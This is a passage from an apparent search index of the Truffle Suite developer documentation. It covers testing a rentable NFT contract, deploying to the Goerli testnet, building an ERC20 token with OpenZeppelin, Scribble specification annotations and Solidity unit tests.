\"ERC721: transfer caller is not owner nor approved\" ); // Assert no UserInfo for NFT var user = await rentablePetsInstance . userOf . call ( 1 ); var date = await rentablePetsInstance . userExpires . call ( 1 ); assert . equal ( user , constants . ZERO_ADDRESS , \"NFT user is not zero address\" ); assert . equal ( date , 0 , \"NFT expiration date is not 0\" ); }); it ( \"should return the correct UserInfo\" , async () => { const rentablePetsInstance = await RentablePets . deployed (); const expirationDatePast = 1660252958 ; // Aug 8 2022 const expirationDateFuture = 4121727755 ; // Aug 11 2100 await rentablePetsInstance . mint ( \"fakeURI\" ); await rentablePetsInstance . mint ( \"fakeURI\" ); // Set and get UserInfo var expiredTx = await rentablePetsInstance . setUser ( 2 , accounts [ 1 ], expirationDatePast ) var unexpiredTx = await rentablePetsInstance . setUser ( 3 , accounts [ 2 ], expirationDateFuture ) var expiredNFTUser = await rentablePetsInstance . userOf . call ( 2 ); var expiredNFTDate = await rentablePetsInstance . userExpires . call ( 2 ); var unexpireNFTUser = await rentablePetsInstance . userOf . call ( 3 ); var unexpiredNFTDate = await rentablePetsInstance . userExpires . call ( 3 ); // Assert UserInfo and event transmission assert . equal ( expiredNFTUser , constants . ZERO_ADDRESS , \"Expired NFT has wrong user\" ); assert . equal ( expiredNFTDate , expirationDatePast , \"Expired NFT has wrong expiration date\" ); expectEvent ( expiredTx , \"UpdateUser\" , { tokenId : \"2\" , user : accounts [ 1 ], expires : expirationDatePast . toString ()}); assert . equal ( unexpireNFTUser , accounts [ 2 ], \"Expired NFT has wrong user\" ); assert . equal ( unexpiredNFTDate , expirationDateFuture , \"Expired NFT has wrong expiration date\" ); expectEvent ( unexpiredTx , \"UpdateUser\" , { tokenId : \"3\" , user : accounts [ 2 ], expires : expirationDateFuture . toString ()}); // Burn NFT unexpiredTx = await rentablePetsInstance . burn ( 3 ); // Assert UserInfo was deleted unexpireNFTUser = await rentablePetsInstance . userOf . call ( 3 ); unexpiredNFTDate = await rentablePetsInstance . userExpires . call ( 3 ); assert . equal ( unexpireNFTUser , constants . ZERO_ADDRESS , \"NFT user is not zero address\" ); assert . equal ( unexpiredNFTDate , 0 , \"NFT expiration date is not 0\" ); expectEvent ( unexpiredTx , \"UpdateUser\" , { tokenId : \"3\" , user : constants . ZERO_ADDRESS , expires : \"0\" }); }); }); There's one special thing to call out here: To test that setUser fails when msg.sender is not owner , we can fake the sender by adding the extra from param: rentablePetsInstance . setUser ( 1 , accounts [ 1 ], expirationDatePast , { from : accounts [ 1 ]}) If you run into issues testing, using the Truffle debugger is really helpful!", "title": "Test Your Smart Contract"}, {"location": "guides/rentable-nft/#mint-an-nft-and-view-it-in-your-mobile-wallet-or-opensea", "text": "If you want to mint an NFT for yourself and view it in your mobile MetaMask wallet, you'll need to deploy your contract to a public testnet or mainnet. To do so, you'll need to grab your Infura project API from your Infura project and your MetaMask wallet secret key. At the root of your folder, add a .env file, in which we'll put in that information. WARNING: DO NOT PUBLICIZE OR COMMIT THIS FILE. We recommend adding .env to a .gitignore file. MNEMONIC = \"YOUR SECRET KEY\" INFURA_API_KEY = \"YOUR INFURA_API_KEY\" Then, at the top of truffle-config.js , add this code to get retrieve that information: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); And finally, add the Goerli network to the networks list under module.exports : goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } Your final truffle-config.js should look something like this: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); module . exports = { networks : { development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }, goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } }, // Set default mocha options here, use special reporters, etc. mocha : { // timeout: 100000 }, // Configure your compilers compilers : { solc : { version : \"0.8.15\" , // Fetch exact version from solc-bin (default: truffle's version) } }, }; Then, we'll need to install the dev dependencies for dotenv and @truffle/hdwallet-provider . Lastly, run truffle migrate --network goerli to deploy! npm i --save-dev dotenv npm i --save-dev @truffle/hdwallet-provider truffle migrate --network goerli Then, to quickly interact with the goerli network, we can use truffle console --network goerli , and call the appropriate contract functions. We've already pinned some metadata to IPFS for you to use as your tokenURI: ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4 . It should look a bit like this: truffle migrate --network goerli truffle ( goerli ) > const contract = await RentablePets.deployed () undefined truffle ( goerli ) > await contract.mintNFT ( \"YOUR ADDRESS\" , \"ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4\" ) If you want to populate your own metadata, there are a variety of ways to do so - with either Truffle or Infura. Check out the guides here: - truffle preserve - infura IPFS To view your NFT on your mobile wallet, open up MetaMask mobile, switch to the Goerli network, and open the NFTs tab! To view on OpenSea, you'll have to deploy to mainnet or Polygon. Otherwise, if you deploy your contract to rinkeby , you can view it on https://testnets.opensea.io/ . To be aware that rinkeby will be deprecated after the merge . If you don't want to monitor your transactions in an Infura project, you can also deploy via Truffle Dashboard , which allows you to deploy and sign transactions via MetaMask - thus never revealing your private key! To do so, simply run: truffle dashboard truffle migrate --network dashboard truffle console --network dashboard", "title": "Mint an NFT and View it in Your Mobile Wallet or OpenSea!"}, {"location": "guides/rentable-nft/#future-extensions", "text": "And there you have it! You've written a rentable NFT contract! Look out for a more in-depth guide for uploading your metadata to IPFS! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . In future editions of Web3 Unleashed, get excited to integrate this into a full-stack DApp. That is, a NFT rental marketplace that will use both the ERC-4907 rentable standard and ERC-2981 royalty standard If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Smart contracts deployed to the Ethereum mainnet can deal with real money, so having our Solidity code free from errors and highly secure is essential. Zeppelin Solutions , a smart contract auditing service, has recognized this need. Using their experience, they've put together a set of vetted smart contracts called OpenZeppelin . We can use and extend these contracts to create more secure dapps in less time. OpenZeppelin comes with a wide array of smart contracts for various important functions ( see them all here ), but today we'll be focusing on their token contracts. Specifically, we'll be extending their StandardToken.sol contract to create our own ERC20 -compliant token. Requirements \u00b6 This tutorial expects you to have some knowledge of Truffle, Ethereum, and Solidity. If you haven't gone through our Ethereum overview and our Pet Shop tutorial yet, those would be great places to start. For even more information, please see the following links: Truffle documentation Ethereum Solidity documentation We will primarily be using the command line for this tutorial, so please ensure you have basic familiarity with your operating system's terminal. Overview \u00b6 In this tutorial we will be covering: Unboxing the front-end application Creating the \"TutorialToken\" smart contract Compiling and deploying the smart contract Interacting with the new token Unboxing the front-end application \u00b6 In this tutorial, we are focusing on smart contract creation. To that end, we've created the front-end for you in the form of a Truffle Box. On a terminal, create a project directory and navigate to it: mkdir oz-workspace cd oz-workspace Unbox the tutorialtoken Truffle Box. This will give us our project template. truffle unbox tutorialtoken Next, we'll install OpenZeppelin. The most recent version of OpenZeppelin can be found as an npm package. npm install openzeppelin-solidity Creating the \"TutorialToken\" smart contract \u00b6 With our front-end taken care of, we can focus on the TutorialToken contract. In the contracts/ directory of your Truffle Box, create the file TutorialToken.sol and add the following contents: pragma solidity ^ 0.4.24 ; import \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\" ; contract TutorialToken is ERC20 { } Things to notice: Beyond the standard smart contract setup, we import the StandardToken.sol contract and declare our TutorialToken . We use is to inherit from the StandardToken contract. Our contract will inherit all variables and functions from the StandardToken contract. Inherited functions and variables can be overwritten by redeclaring them in the new contract. To set our own parameters for the token, we'll be declaring our own name, symbol, and other details. Add the following content block to the contract (between the curly braces): string public name = \"TutorialToken\" ; string public symbol = \"TT\" ; uint8 public decimals = 2 ; uint public INITIAL_SUPPLY = 12000 ; Things to notice: The name and symbol variables give our token a unique identity. The decimals variable determines the degree to which this token can be subdivided. For our example we went with 2 decimal places, similar to dollars and cents. The INITIAL_SUPPLY variable determines the number of tokens created when this contract is deployed. In this case, the number is arbitrary. To finish up our contract, we'll create a constructor function to mint with the totalSupply equal to our declared INITIAL_SUPPLY and give the entire supply to the deploying account's address. Add this block below the content added in the previous step: constructor () public { _mint ( msg.sender , INITIAL_SUPPLY ); } Using less than 15 lines of hand-coded Solidity, we've created our own Ethereum token! Compiling and deploying the smart contract \u00b6 In the migrations/ directory, create the file 2_deploy_contracts.js and add the following content: var TutorialToken = artifacts . require ( \"TutorialToken\" ); module . exports = function ( deployer ) { deployer . deploy ( TutorialToken ); }; The import statement within our TutorialToken contract will be automatically handled by the compiler, along with any subsequent imports within StandardToken . Now we are ready to compile and deploy your contract to the blockchain. For this tutorial, we will use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. **Note**: Read more about Ganache in the [Ganache documentation](/docs/ganache). With our blockchain launched, head back to your terminal. Inside your project, run the following command to compile the contract: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/truffle/reference/configuration#resolving-naming-conflicts-on-windows). Once the compile has completed, deploy the contract to the blockchain: truffle migrate You will see output that looks similar to this: Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... ... 0xa4470beb31f490e26b9a8b0d677cb7107ae5ef5bf40f8ee59fe040d35ca4f598 Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0 Saving successful migration to network... ... 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956 Saving artifacts... Running migration: 2_deploy_contracts.js Deploying TutorialToken... ... 0xcc01dcbe77f79cf4c21e5642bfee50a6db78b7d6dedb9f8b363ec4110e92436d TutorialToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 Saving successful migration to network... ... 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0 Saving artifacts... Ganache will also list these transactions as well. Interacting with the new token \u00b6 For this portion of the tutorial, we recommend using MetaMask , a browser extension for Chrome and Firefox. It will allow you to switch between accounts quickly, perfect for testing the ability to transfer our newly created tokens. Our Pet Shop tutorial has more information about configuring MetaMask . You will want to enter the mnemonic displayed in Ganache into MetaMask, and make sure that MetaMask is listening to the Custom RPC http://127.0.0.1:7545 . **Warning**: Do not use the Main Network in MetaMask. If you send ether to any account generated from Ganache's default mnemonic, you will lose it all! Still in your terminal, run a local web server containing the front-end application: npm run dev A browser window should automatically open with the interface below: Our basic dapp shows the TutorialToken balance of the selected account in MetaMask. Now we'll transfer some TutorialToken tokens to a different account. Ganache, when launched, lists 10 accounts. The first account has the token balance. Pick one of the other accounts (we recommend the second account) and enter it in the \"Address\" box, and also enter 2000 in the \"Amount\" field. Click \"Transfer\" to initiate the token transfer. MetaMask will intercept the transfer request and display a confirmation. Note that no ether is changing hands, except for the gas used to pay for the transaction. Click \"Submit\" and the transfer will proceed. If all goes well, you will see a window saying \"Transfer successful\". You will also see a record of the transaction in MetaMask, and a new transaction will be displayed at the top of the \"Transactions\" section in Ganache. Still in MetaMask, switch from the first account to the second one (you may need to select \"Create an account\" if only one account is in the list.) Now refresh the app in your browser. It will be connected to the currently selected account in MetaMask, and display the amount of tokens (in this case, 2000 TT). This shows that the transfer did in fact succeed. Try sending different amount of tokens to different accounts to practice how our dapp (and MetaMask) interacts with the network. We at Truffle are excited to see companies like Zeppelin Solutions contributing to the standardization and increased security of smart contracts. With OpenZeppelin's contracts and Truffle's tools, you have everything you need to start creating industry-standard distributed applications. Happy coding!", "title": "Truffle Suite"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#requirements", "text": "This tutorial expects you to have some knowledge of Truffle, Ethereum, and Solidity. If you haven't gone through our Ethereum overview and our Pet Shop tutorial yet, those would be great places to start. For even more information, please see the following links: Truffle documentation Ethereum Solidity documentation We will primarily be using the command line for this tutorial, so please ensure you have basic familiarity with your operating system's terminal.", "title": "Requirements"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#overview", "text": "In this tutorial we will be covering: Unboxing the front-end application Creating the \"TutorialToken\" smart contract Compiling and deploying the smart contract Interacting with the new token", "title": "Overview"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#unboxing-the-front-end-application", "text": "In this tutorial, we are focusing on smart contract creation. To that end, we've created the front-end for you in the form of a Truffle Box. On a terminal, create a project directory and navigate to it: mkdir oz-workspace cd oz-workspace Unbox the tutorialtoken Truffle Box. This will give us our project template. truffle unbox tutorialtoken Next, we'll install OpenZeppelin. The most recent version of OpenZeppelin can be found as an npm package. npm install openzeppelin-solidity", "title": "Unboxing the front-end application"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#creating-the-tutorialtoken-smart-contract", "text": "With our front-end taken care of, we can focus on the TutorialToken contract. In the contracts/ directory of your Truffle Box, create the file TutorialToken.sol and add the following contents: pragma solidity ^ 0.4.24 ; import \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\" ; contract TutorialToken is ERC20 { } Things to notice: Beyond the standard smart contract setup, we import the StandardToken.sol contract and declare our TutorialToken . We use is to inherit from the StandardToken contract. Our contract will inherit all variables and functions from the StandardToken contract. Inherited functions and variables can be overwritten by redeclaring them in the new contract. To set our own parameters for the token, we'll be declaring our own name, symbol, and other details. Add the following content block to the contract (between the curly braces): string public name = \"TutorialToken\" ; string public symbol = \"TT\" ; uint8 public decimals = 2 ; uint public INITIAL_SUPPLY = 12000 ; Things to notice: The name and symbol variables give our token a unique identity. The decimals variable determines the degree to which this token can be subdivided. For our example we went with 2 decimal places, similar to dollars and cents. The INITIAL_SUPPLY variable determines the number of tokens created when this contract is deployed. In this case, the number is arbitrary. To finish up our contract, we'll create a constructor function to mint with the totalSupply equal to our declared INITIAL_SUPPLY and give the entire supply to the deploying account's address. Add this block below the content added in the previous step: constructor () public { _mint ( msg.sender , INITIAL_SUPPLY ); } Using less than 15 lines of hand-coded Solidity, we've created our own Ethereum token!", "title": "Creating the \"TutorialToken\" smart contract"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#compiling-and-deploying-the-smart-contract", "text": "In the migrations/ directory, create the file 2_deploy_contracts.js and add the following content: var TutorialToken = artifacts . require ( \"TutorialToken\" ); module . exports = function ( deployer ) { deployer . deploy ( TutorialToken ); }; The import statement within our TutorialToken contract will be automatically handled by the compiler, along with any subsequent imports within StandardToken . Now we are ready to compile and deploy your contract to the blockchain. For this tutorial, we will use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. **Note**: Read more about Ganache in the [Ganache documentation](/docs/ganache). With our blockchain launched, head back to your terminal. Inside your project, run the following command to compile the contract: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/truffle/reference/configuration#resolving-naming-conflicts-on-windows). Once the compile has completed, deploy the contract to the blockchain: truffle migrate You will see output that looks similar to this: Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... ... 0xa4470beb31f490e26b9a8b0d677cb7107ae5ef5bf40f8ee59fe040d35ca4f598 Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0 Saving successful migration to network... ... 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956 Saving artifacts... Running migration: 2_deploy_contracts.js Deploying TutorialToken... ... 0xcc01dcbe77f79cf4c21e5642bfee50a6db78b7d6dedb9f8b363ec4110e92436d TutorialToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10 Saving successful migration to network... ... 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0 Saving artifacts... Ganache will also list these transactions as well.", "title": "Compiling and deploying the smart contract"}, {"location": "guides/robust-smart-contracts-with-openzeppelin/#interacting-with-the-new-token", "text": "For this portion of the tutorial, we recommend using MetaMask , a browser extension for Chrome and Firefox. It will allow you to switch between accounts quickly, perfect for testing the ability to transfer our newly created tokens. Our Pet Shop tutorial has more information about configuring MetaMask . You will want to enter the mnemonic displayed in Ganache into MetaMask, and make sure that MetaMask is listening to the Custom RPC http://127.0.0.1:7545 . **Warning**: Do not use the Main Network in MetaMask. If you send ether to any account generated from Ganache's default mnemonic, you will lose it all! Still in your terminal, run a local web server containing the front-end application: npm run dev A browser window should automatically open with the interface below: Our basic dapp shows the TutorialToken balance of the selected account in MetaMask. Now we'll transfer some TutorialToken tokens to a different account. Ganache, when launched, lists 10 accounts. The first account has the token balance. Pick one of the other accounts (we recommend the second account) and enter it in the \"Address\" box, and also enter 2000 in the \"Amount\" field. Click \"Transfer\" to initiate the token transfer. MetaMask will intercept the transfer request and display a confirmation. Note that no ether is changing hands, except for the gas used to pay for the transaction. Click \"Submit\" and the transfer will proceed. If all goes well, you will see a window saying \"Transfer successful\". You will also see a record of the transaction in MetaMask, and a new transaction will be displayed at the top of the \"Transactions\" section in Ganache. Still in MetaMask, switch from the first account to the second one (you may need to select \"Create an account\" if only one account is in the list.) Now refresh the app in your browser. It will be connected to the currently selected account in MetaMask, and display the amount of tokens (in this case, 2000 TT). This shows that the transfer did in fact succeed. Try sending different amount of tokens to different accounts to practice how our dapp (and MetaMask) interacts with the network. We at Truffle are excited to see companies like Zeppelin Solutions contributing to the standardization and increased security of smart contracts. With OpenZeppelin's contracts and Truffle's tools, you have everything you need to start creating industry-standard distributed applications. Happy coding!", "title": "Interacting with the new token"}, {"location": "guides/scribble/", "text": "Supercharge your test suite with Scribble! \u00b6 Scribble is a specification language that we built at ConsenSys diligence. The core idea is to add comments to your code that say what the code is supposed to do! //#if_succeeds old(balanceOf(to)) + value == balanceOf(to); function transfer ( to , value ) public returns ( bool ) {} Scribbling your contracts isn't just for documentation purposes! Using the Scribble CLI, we translate those comments into solidity code that checks that the annotation is correct! We call this process instrumentation . In this case Scribble will create something which looks like this: function transfer ( to , value ) public returns ( bool ) { uint oldBalance = balanceOf ( to ); ... assert ( oldBalance + value == balanceOf ( to )); return true ; } Testing \u00b6 What if I told you we could use Scribble to upgrade your regular old unit test suite! If you look back to the transfer example above, Scribble inserts Solidity assertions to check properties. Fortunately for us, Truffle test cases will report a failure whenever there is a solidity level assertion. Imagine a scenario where you have a bug, but your test suite (with 100% coverage) doesn't have the assertions to detect it. This is where Scribble will come in handy! Having written some annotations, you can enhance your test suite with tons of extra checks. The chances are that one of these checks will trigger because of the bug! Your unit tests are levelled up by Scribble annotations through the tons of assertions that meticulously (and automatically) get added by the CLI! It's often easier to write a Scribble annotation than to do the actual assertion in javascript. Take the following example. Here I add a single annotation that will ensure that all tests check that the total supply is equal to the sum of balances for my Token. ///#invariant unchecked_sum(balances) == totalSupply; contract MyToken { ... } Now any test that modifies the totalSupply or an entry in the balances mapping will check that they are in sync! How to do It \u00b6 There are four simple steps to run your first Scribble enhanced test. Install Scribble Write an annotation Run Scribble instrumentation Run your test suite Installation \u00b6 First things first, you're going to install Scribble: $ npm install -g eth-scribble \ud83d\udca1 Pro-tip: If you're using VSCode then install our vscode-scribble extension . Writing Annotations \u00b6 Next, you're going to write an annotation. The exact annotation that you'd write is particular to your smart contracts, but you can use the earlier example for inspiration! ///#if_succeeds old(balanceOf(to)) + value == balanceOf(to); function transfer ( to , value ) public returns ( bool ) {} \ud83d\udcda Check out the Scribble documentation on writing annotations. Instrumentation and Testing \u00b6 We're ready to start testing with the Scribble annotation(s) in place. First, you'll use the Scribble CLI to take all the annotations and transform them into solidity code. Next, you'll run your test suite as you usually would; but now with the added benefit of the Scribble instrumentation. Finally, you clean up the Scribble instrumentation. You can do all this by executing the following three commands(replacing myToken.sol with the filename for the contract you just annotated): $ scribble --arm -m files myToken.sol $ truffle test $ scribble --disarm -m files myToken.sol Next Steps \u00b6 That's it! You now know all you need to start supercharging your unit tests. Your next step after levelling up your unit tests is to use fuzzing. Fuzzing finds bugs by automatically generating millions of test cases. The chances are that it will come up with several edge cases that you missed with your manual unit tests! Read more about fuzzing Scribble annotations here !", "title": "Truffle Suite"}, {"location": "guides/scribble/#supercharge-your-test-suite-with-scribble", "text": "Scribble is a specification language that we built at ConsenSys diligence. The core idea is to add comments to your code that say what the code is supposed to do! //#if_succeeds old(balanceOf(to)) + value == balanceOf(to); function transfer ( to , value ) public returns ( bool ) {} Scribbling your contracts isn't just for documentation purposes! Using the Scribble CLI, we translate those comments into solidity code that checks that the annotation is correct! We call this process instrumentation . In this case Scribble will create something which looks like this: function transfer ( to , value ) public returns ( bool ) { uint oldBalance = balanceOf ( to ); ... assert ( oldBalance + value == balanceOf ( to )); return true ; }", "title": "Supercharge your test suite with Scribble!"}, {"location": "guides/scribble/#testing", "text": "What if I told you we could use Scribble to upgrade your regular old unit test suite! If you look back to the transfer example above, Scribble inserts Solidity assertions to check properties. Fortunately for us, Truffle test cases will report a failure whenever there is a solidity level assertion. Imagine a scenario where you have a bug, but your test suite (with 100% coverage) doesn't have the assertions to detect it. This is where Scribble will come in handy! Having written some annotations, you can enhance your test suite with tons of extra checks. The chances are that one of these checks will trigger because of the bug! Your unit tests are levelled up by Scribble annotations through the tons of assertions that meticulously (and automatically) get added by the CLI! It's often easier to write a Scribble annotation than to do the actual assertion in javascript. Take the following example. Here I add a single annotation that will ensure that all tests check that the total supply is equal to the sum of balances for my Token. ///#invariant unchecked_sum(balances) == totalSupply; contract MyToken { ... } Now any test that modifies the totalSupply or an entry in the balances mapping will check that they are in sync!", "title": "Testing"}, {"location": "guides/scribble/#how-to-do-it", "text": "There are four simple steps to run your first Scribble enhanced test. Install Scribble Write an annotation Run Scribble instrumentation Run your test suite", "title": "How to do It"}, {"location": "guides/scribble/#installation", "text": "First things first, you're going to install Scribble: $ npm install -g eth-scribble \ud83d\udca1 Pro-tip: If you're using VSCode then install our vscode-scribble extension .", "title": "Installation"}, {"location": "guides/scribble/#writing-annotations", "text": "Next, you're going to write an annotation. The exact annotation that you'd write is particular to your smart contracts, but you can use the earlier example for inspiration! ///#if_succeeds old(balanceOf(to)) + value == balanceOf(to); function transfer ( to , value ) public returns ( bool ) {} \ud83d\udcda Check out the Scribble documentation on writing annotations.", "title": "Writing Annotations"}, {"location": "guides/scribble/#instrumentation-and-testing", "text": "We're ready to start testing with the Scribble annotation(s) in place. First, you'll use the Scribble CLI to take all the annotations and transform them into solidity code. Next, you'll run your test suite as you usually would; but now with the added benefit of the Scribble instrumentation. Finally, you clean up the Scribble instrumentation. You can do all this by executing the following three commands(replacing myToken.sol with the filename for the contract you just annotated): $ scribble --arm -m files myToken.sol $ truffle test $ scribble --disarm -m files myToken.sol", "title": "Instrumentation and Testing"}, {"location": "guides/scribble/#next-steps", "text": "That's it! You now know all you need to start supercharging your unit tests. Your next step after levelling up your unit tests is to use fuzzing. Fuzzing finds bugs by automatically generating millions of test cases. The chances are that it will come up with several edge cases that you missed with your manual unit tests! Read more about fuzzing Scribble annotations here !", "title": "Next Steps"}, {"location": "guides/solidity-unit-tests/", "text": "This is a beta document and refers to the beta version of Truffle. The following features will not work unless you are using Truffle Beta. Get the Beta Version \u00b6 As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta Overview \u00b6 Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included in the mocha run with a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean slate per test suite, access to deployed contracts via migrations, runnable on any Ethereum client, and usage of snapshot/revert features (if supported by your Ethereum client) for increased speed. An example solidity unit test looks like this: import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetacoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } And when running the test: $ truffle test Compiling ConvertLib.sol... Compiling MetaCoin.sol... Compiling ../test/TestMetacoin.sol... TestMetacoin \u2713 testInitialBalanceUsingDeployedContract ( 61ms ) \u2713 testInitialBalanceWithNewMetaCoin ( 69ms ) 2 passing ( 3s ) There are some very important structural items to discuss: First, your assertion functions are provided by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library outputs the correct events to the test runner. You can find all available assertion functions in Assert.sol . These functions are meant to mimic those available in your Javascript tests, and more documentation will be written about each function in the future. The addresses of your deployed contracts (contracts that were deployed in your migration) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with a clean slate deployment. This library provides functions for all of your deployed contracts, in the form of: DeployedAddresses . < contract name > (); This will return an address that you can then use to access that contract. In order to use the deployed contract, you'll have to import the contract code first. Notice import \"../contracts/MetaCoin.sol\"; in the example. This import is relative to the test contract, which exists in the ./test directory, and it goes outside of the test directory in order to find the MetaCoin contract. It then uses that contract in a test function below to cast the address to the MetaCoin type. All test contracts must start with Test , using an uppercase T . This distinguishes this contract apart from test helpers and project contracts, letting the test runner know it represents a test contract. Like test contract names, all test functions must start with test , all lowercase. Each test function is executed as a single transaction, in order of appearance in the test file (like your Javascript tests). Assertion functions provided by truffle/Assert.sol trigger events that the test runner evaluates to determine the result of the test. Assertion functions return a boolean representing the outcome of the assertion which you can use to return from the test early to prevent execution errors. You are provided many test hooks, shown in the example below. These hooks are beforeAll , beforeEach , afterAll and afterEach , which are the same hooks provided by mocha in your Javascript tests. You can use these hooks to perform setup and teardown actions before and after each test, or before and after each suite is run. Like test functions, each hook is executed as a single transaction. Note that some complex tests will need to perform a significant amount of setup that might overflow the gas limit of a single transaction; you can get around this limitation by creating many hooks with different suffixes, like in the example test below: import \"truffle/Assert.sol\" ; contract TestHooks { uint someValue ; function beforeEach () { someValue = 5 ; } function beforeEachAgain () { someValue += 1 ; } function testSomeValueIsSix () { uint expected = 6 ; Assert . equal ( someValue , expected , \"someValue should have been 6\" ); } } This test contract also shows that your test functions and hook functions all share the same contract state. You can setup contract data before the test, use that data during the test, and reset it afterward in preparation for the next one. Note that just like your Javascript tests, your next test function will continue from the state of the previous test function that ran. You do not need to extend from any Test contract like in other solidity testing frameworks. This is to make writing solidity unit tests easier, and should allow for more extensibility in the future with less hassle. Like Javascript tests, failing tests return the events that were fired (minus assertion events) so you can get a better sense of how your contracts-under-test performed.", "title": "Truffle Suite"}, {"location": "guides/solidity-unit-tests/#get-the-beta-version", "text": "As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta", "title": "Get the Beta Version"}, {"location": "guides/solidity-unit-tests/#overview", "text": "Solidity test contracts live alongside Javascript tests as .sol files. When truffle test is run, they will be included in the mocha run with a separate test suite per test contract. These contracts maintain all the benefits of the Javascript tests: namely a clean slate per test suite, access to deployed contracts via migrations, runnable on any Ethereum client, and usage of snapshot/revert features (if supported by your Ethereum client) for increased speed. An example solidity unit test looks like this: import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/MetaCoin.sol\" ; contract TestMetacoin { function testInitialBalanceUsingDeployedContract () { MetaCoin meta = MetaCoin ( DeployedAddresses . MetaCoin ()); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } function testInitialBalanceWithNewMetaCoin () { MetaCoin meta = new MetaCoin (); uint expected = 10000 ; Assert . equal ( meta . getBalance ( tx.origin ), expected , \"Owner should have 10000 MetaCoin initially\" ); } } And when running the test: $ truffle test Compiling ConvertLib.sol... Compiling MetaCoin.sol... Compiling ../test/TestMetacoin.sol... TestMetacoin \u2713 testInitialBalanceUsingDeployedContract ( 61ms ) \u2713 testInitialBalanceWithNewMetaCoin ( 69ms ) 2 passing ( 3s ) There are some very important structural items to discuss: First, your assertion functions are provided by the truffle/Assert.sol library. This is the default assertion library, however you can include your own assertion library so long as the library outputs the correct events to the test runner. You can find all available assertion functions in Assert.sol . These functions are meant to mimic those available in your Javascript tests, and more documentation will be written about each function in the future. The addresses of your deployed contracts (contracts that were deployed in your migration) are available through the truffle/DeployedAddresses.sol library. This is provided by Truffle and is recompiled and relinked before each suite is run to provide your tests with 